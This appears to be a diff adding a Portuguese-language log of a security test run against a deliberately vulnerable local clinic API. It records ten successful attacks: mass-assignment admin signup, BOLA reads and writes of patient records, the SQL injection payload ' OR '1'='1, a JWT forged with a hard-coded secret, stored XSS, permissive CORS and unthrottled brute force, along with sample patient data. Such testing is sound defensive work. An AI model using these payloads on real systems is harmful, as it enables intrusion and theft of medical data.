@@ -1,0 +1,23 @@
+##### alvo: baseline (http://127.0.0.1:8001) #####
+[A1] EXPLORADO A01 / API3 — mass assignment + escalada de privilégio — POST /user/signup sem login, com role=admin
+        HTTP 200 {"message":"Usuário criado com sucesso!"}
+[A2] EXPLORADO A01 / API1 — BOLA (leitura) — GET /appointment/1 por outro profissional
+        HTTP 200 {"date_time":"2026-10-05T09:00:00","id":1,"reason":"Retorno de exames","notes":"Paciente refere melhora. PA 120/80.","internal_audit_note":"revisar-depois","pat…
+[A3] EXPLORADO A01 / API1 — BOLA (mesmo padrão, outro endpoint) — GET /patient/1 por outro profissional
+        HTTP 200 {"professional_id":3,"cpf":"52998224725","phone":"11999000000","id":1,"name":"Maria da Silva"}
+[A4] EXPLORADO A01 / API1 — BOLA (escrita) — PUT /appointment/1 por outro profissional
+        HTTP 200 {"date_time":"2026-10-05T09:00:00","id":1,"reason":"Retorno de exames","notes":"ADULTERADO PELO ATACANTE","internal_audit_note":"revisar-depois","patient_id":1,…
+[A5] EXPLORADO A03 — SQL injection — GET /patient/search?name=' OR '1'='1
+        HTTP 200 [{"id":1,"name":"Maria da Silva","cpf":"52998224725","phone":"11999000000","professional_id":3},{"id":2,"name"… | linhas devolvidas: 4 (Paulo só tem 2 pacientes)
+[A6] EXPLORADO A02 / A07 — segredo JWT fixo => token forjado — GET /user/ com JWT de admin assinado com o segredo do repositório
+        HTTP 200 [{"name":"Admin Demo","password":"$2b$04$v8BDpf.ZvebvZWZg94KI5OseTzeXZfbWbfPyvXPZhwWIYuAJueHVS","role":"admin","id":1,"email":"admin@demo.clinica.com.br"},{"nam…
+[A7] EXPLORADO A03 — XSS armazenado — motivo da consulta com <script> exibido na página da recepção
+        gravação: HTTP 200 {"date_time":"2026-10-14T11:00:00","id":5,"reason":"<script>alert('xss… | <script> cru na página: True
+[A9] EXPLORADO API3 — excessive data exposure — campos internos de auditoria e CPF completo nas respostas
+        campos internos devolvidos: ['created_from_ip', 'internal_audit_note'] | CPF completo: True
+[A10] EXPLORADO A05 — security misconfiguration — CORS para origem maliciosa + cabeçalhos HSTS/XFO/XCTO
+        Access-Control-Allow-Origin=https://evil.example.org | cabeçalhos ausentes: ['strict-transport-security', 'x-frame-options', 'x-content-type-options']
+[A8] EXPLORADO A07 — força bruta sem limite — 30 tentativas de login em sequência
+        status das 30 tentativas: 401 x30, 429 x0
+
+RESUMO (baseline): 10 explorados / 0 bloqueados de 10 ataques
